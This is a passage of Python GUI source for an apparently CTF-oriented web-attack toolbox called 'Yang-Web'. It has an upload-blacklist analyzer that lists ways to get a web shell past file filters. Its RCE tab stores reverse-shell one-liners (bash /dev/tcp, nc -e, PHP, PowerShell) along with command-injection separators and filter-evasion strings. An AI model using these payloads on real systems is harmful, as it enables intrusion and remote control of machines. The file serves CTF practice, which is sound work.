            if hasattr(upload, 'get_parse_vuln'):

                all_data["解析漏洞"] = upload.get_parse_vuln()

        except Exception:

            pass

        return all_data if not cat or cat == "全部" else {cat: all_data.get(cat, {})}

    def _upload_analyze(blacklist_str):

        """GUI 靶场黑名单分析."""

        import re

        ALL_EXTS = {'php','php3','php4','php5','php7','php8','phtml','pht','phps','phar','shtml','cgi'}

        blocked = set(re.findall(r'[a-zA-Z0-9]+', blacklist_str.lower()))

        

        lines = []

        lines.append(f"🎯 靶场黑名单分析")

        lines.append(f"  已拦截: {', '.join(sorted(blocked))}")

        

        safe = sorted(ALL_EXTS - blocked)

        if safe:

            lines.append(f"")

            lines.append(f"✅ 可用后缀 (不在黑名单):")

            for ext in safe:

                marker = " ⭐推荐" if ext in ('pht','phtml') else ""

                lines.append(f"  • .{ext}{marker}")

        else:

            lines.append(f"\n❌ 所有常见后缀均在黑名单中")

        

        lines.append(f"")

        lines.append(f"🔤 大小写混合策略:")

        for v in ['Php','pHp','PHP','pHp5','PhP']:

            ext = v.lower()

            tag = "✅" if ext in blocked else "⚪"

            lines.append(f"  {tag} {v}")

        

        lines.append(f"")

        lines.append(f"📦 其他绕过:")

        lines.append(f"  • 双后缀: shell.php.jpg")

        lines.append(f"  • NTFS数据流: shell.php::$DATA")

        lines.append(f"  • 空格/点: shell.php .  (Windows)")

        

        return '\n'.join(lines)



    _add_payload_tab("Upload", "📤", _upload_get,

                     categories=["后缀绕过", "大小写混淆", "多后缀组合", "NTFS & 空格点",

                                  "路径截断", "MIME伪造", "图片马内容绕过", "一句话木马",

                                  ".htaccess/.user.ini", "解析漏洞", "高级技巧"],

                     analyzer_fn=_upload_analyze)



    # ── RCE ──

    def _rce_get(cat):

        data = {

            "反弹Shell": {"各语言反弹Shell": [

                "bash -i >& /dev/tcp/IP/PORT 0>&1",

                "nc -e /bin/sh IP PORT",

                "python3 -c 'import socket,subprocess,os;s=socket.socket();...'",

                "php -r '$sock=fsockopen(\"IP\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",

                "powershell -c \"$c=New-Object System.Net.Sockets.TCPClient('IP',PORT)...\"",

            ]},

            "命令注入链接符": {"链接符": [";", "|", "||", "&&", "&", "%0a", "`", "$(cmd)"]},

            "空格绕过": {"绕过技巧": ["${IFS}", "$IFS$9", "<>", "{ls,-la}", "%09", "%20"]},

            "关键字绕过": {"绕过技巧": ["c''at", "c\\at", "ca$*t", "/???/c?t", "c'a't"]},

        }

        return data if not cat or cat == "全部" else {cat: data.get(cat, [])}

    _add_payload_tab("RCE", "💻", _rce_get,

                     categories=["反弹Shell", "命令注入链接符", "空格绕过", "关键字绕过"])



    # Hash

    notebook.add(HashPanel(notebook), text=" 🔍 Hash ")



    # JWT

    notebook.add(JWTPanel(notebook), text=" 🔑 JWT ")



    # Scripts — 内嵌 CTF 脚本库

    notebook.add(ScriptsPanel(notebook), text=" 📦 脚本库 ")
    notebook.add(AdvancedEncodePanel(notebook), text=" 高级编码 ")
    notebook.add(ChineseCipherPanel(notebook), text=" 中文密码 ")
    notebook.add(CryptoPanel(notebook), text=" 加解密 ")
    notebook.add(ShellPanel(notebook), text=" Shell ")
    notebook.add(StegoPanel(notebook), text=" 隐写分析 ")



    # Misc Crypto — 20+ common cipher types

    notebook.add(MiscCryptoPanel(notebook), text=" 🔐 Misc Crypto ")

    # 📚 CTF 知识文档
    notebook.add(DocsPanel(notebook), text=" 📚 文档 ")

    # 🔫 SQLi-LABS 专项
    if HAS_SQLI_LABS:
        notebook.add(SQLLabsPanel(notebook), text=" 🔫 SQLi靶场 ")

    # 🎮 JS/游戏挑战
    if HAS_JS_SOLVER:
        notebook.add(JSGamePanel(notebook), text=" 🎮 JS游戏 ")



    # ── CLI 模式 — 终端面板 (初始隐藏) ──

    cli_frame = tk.Frame(content, bg=DARK)



    # 终端输出区

    cli_output_frame, cli_output = _output_area(cli_frame, 30)

    cli_output_frame.pack(fill=tk.BOTH, expand=True, padx=6, pady=(6, 0))

    cli_output.configure(bg=DARK, fg=GREEN, font=("Cascadia Code", 10),

                         insertbackground=GREEN)



    # 底部输入行

    input_bar = tk.Frame(cli_frame, bg=DARK, height=34)

    input_bar.pack(fill=tk.X, padx=6, pady=6)

    input_bar.pack_propagate(False)



    prompt_label = tk.Label(input_bar, text=">>>", bg=DARK, fg=YELLOW,

                            font=("Cascadia Code", 11, "bold"))

    prompt_label.pack(side=tk.LEFT, padx=(6, 2), pady=4)



    cli_entry = tk.Entry(input_bar, bg=INPUT_BG, fg=FG, insertbackground=ACCENT,

                         relief="flat", borderwidth=0,

                         font=("Cascadia Code", 11))

    cli_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, ipady=3, padx=(2, 6))



    # ── CLI 历史与命令执行 ──

    import io

    from .cli import main as cli_main



    cli_history = []

    history_idx = [0]



    def _run_cli_cmd(cmd_text):

        _append(cli_output, f"{'>'*3} {cmd_text}", "input")



        if not cmd_text.strip():

            return



        cli_history.append(cmd_text)

        history_idx[0] = len(cli_history)



        # 内置命令

        if cmd_text.strip().lower() in ("clear", "cls"):

            _clear_output(cli_output)

            return

        if cmd_text.strip().lower() in ("help", "-h", "--help"):

            _append(cli_output, """

  Commands (same as CLI):

    decode BASE64 <text>       decode <text>           hashid <hash>

    encode BASE64 <text>       encode <text>           jwt <token>

    ssti python <tpl>          ssti <engine> <tpl>     scripts --run <name>

    sqli mysql <payload>       sqli <db> <payload>     scripts --search <kw>

    lfi <target>               lfi <path>              solve <url>

    ssrf <target>              ssrf <url>              scan dirs|files

    xss <target>               xss <context>           misc (密码知识库)

    rce <target>               rce <cmd>               clear, help, exit

    php <payload>               php <type>

  Tip: prefix all CLI-style args as-is, e.g.  scripts --run 'rsa_toolkit'

""")

            return

        if cmd_text.strip().lower() in ("exit", "quit"):

            return  # handled by toggle



        # Capture stdout

        old_stdout = sys.stdout

        old_stderr = sys.stderr

        buf = io.StringIO()

        sys.stdout = buf

        sys.stderr = buf



        try:

            # 拆分参数 (处理引号)

            import shlex

            try:

                args = shlex.split(cmd_text)

            except ValueError:

                args = cmd_text.split()



            sys.argv = ["yang_web"] + args

            try:

                cli_main()

            except SystemExit:

                pass



            out = buf.getvalue()

            if out.strip():

                for line in out.rstrip().split("\n"):

                    _append(cli_output, line)

            else:

                _append(cli_output, "(ok)")

        except Exception as e:

            _append(cli_output, f"Error: {e}")

        finally:

            sys.stdout = old_stdout

            sys.stderr = old_stderr

            buf.close()



    def _on_cli_enter(event):

        cmd = cli_entry.get().strip()

        if cmd.lower() in ("exit", "quit"):

            cli_entry.delete(0, tk.END)

            _toggle_mode()

            return

        _run_cli_cmd(cmd)

        cli_entry.delete(0, tk.END)



    def _on_cli_up(event):

        if not cli_history:

            return "break"

        if history_idx[0] > 0:

            history_idx[0] -= 1

        cli_entry.delete(0, tk.END)

        cli_entry.insert(0, cli_history[history_idx[0]])

        return "break"



    def _on_cli_down(event):

        if not cli_history:

            return "break"

        if history_idx[0] < len(cli_history) - 1:

            history_idx[0] += 1

            cli_entry.delete(0, tk.END)

            cli_entry.insert(0, cli_history[history_idx[0]])

        else:

            history_idx[0] = len(cli_history)

            cli_entry.delete(0, tk.END)

        return "break"



    cli_entry.bind("<Return>", _on_cli_enter)

    cli_entry.bind("<Up>", _on_cli_up)

    cli_entry.bind("<Down>", _on_cli_down)



    def _show_cli_welcome():

        _append(cli_output, "▔" * 60)

        _append(cli_output, "  Yang-Web CLI  —  嵌入式终端")

        _append(cli_output, f"  41 脚本  ·  15 模块  ·  离线运行")

        _append(cli_output, "▔" * 60)

        _append(cli_output, "  Type 'help' for commands, 'exit' to return to GUI")

        _append(cli_output, "")



    # ── 模式切换逻辑 ──

    def _toggle_mode():

        if mode["current"] == "gui":

            # 切换到 CLI

            gui_frame.pack_forget()

            cli_frame.pack(fill=tk.BOTH, expand=True)

            mode["current"] = "cli"

            toggle_btn.configure(text="🖥 GUI", fg=YELLOW)

            mode_label.configure(text="命令行模式  ·  Type 'help'  ·  'exit' 返回 GUI")



            # 欢迎信息

            _clear_output(cli_output)

            _show_cli_welcome()

            cli_entry.focus_set()

        else:

            # 切换回 GUI

            cli_frame.pack_forget()

            gui_frame.pack(fill=tk.BOTH, expand=True)

            mode["current"] = "gui"

            toggle_btn.configure(text="💻 CLI", fg=ACCENT)

            mode_label.configure(text="全能 CTF 工具箱 v2.0  ·  50+ 模块 + 8大负载 + 6引擎")



    toggle_btn.configure(command=_toggle_mode)



    # 初始显示 GUI

    gui_frame.pack(fill=tk.BOTH, expand=True)



    # ── 底部状态栏 ──

    status = tk.Frame(root, bg=DARK, height=28)

    status.pack(fill=tk.X, side=tk.BOTTOM)

    status.pack_propagate(False)

    tk.Label(status, text="Yang-Web v1.4.0  |  GUI+CLI 双模式  |  上传靶场分析 + SQLi认证绕过  |  💻 切换",

             bg=DARK, fg=BORDER, font=("Microsoft YaHei UI", 8)).pack(side=tk.LEFT, padx=16, pady=4)



    root.mainloop()





if __name__ == "__main__":

    run_gui()

